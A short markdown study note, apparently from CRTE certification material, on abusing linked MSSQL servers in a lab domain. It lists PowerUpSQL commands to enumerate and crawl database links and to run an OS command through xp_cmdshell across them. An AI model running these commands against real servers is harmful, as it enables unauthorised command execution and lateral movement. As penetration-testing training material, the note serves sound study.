# Methodology
>1. Enumerate links to remote servers.
>2. Abuse links to get foothold on remote servers.

---
# Powershell
>**ℹ️ Info:**
>
> Remember to follow the [PowerShell scripts methodology](Notes/Certifications/CRTE/00%20-%20Miscellaneous/01-%20Methodology.md#PowerShell%20Scripts).

## PowerUpSQL
https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.psd1

**Enumerate MSSQL links:**
```powershell
Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
```

**Crawl MSSQL links:**
```powershell
Get-SQLServerLinkCrawl -Instance us-mssql -Verbose
```

**Execute command where xp_cmdshell enabled:**
```powershell
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
```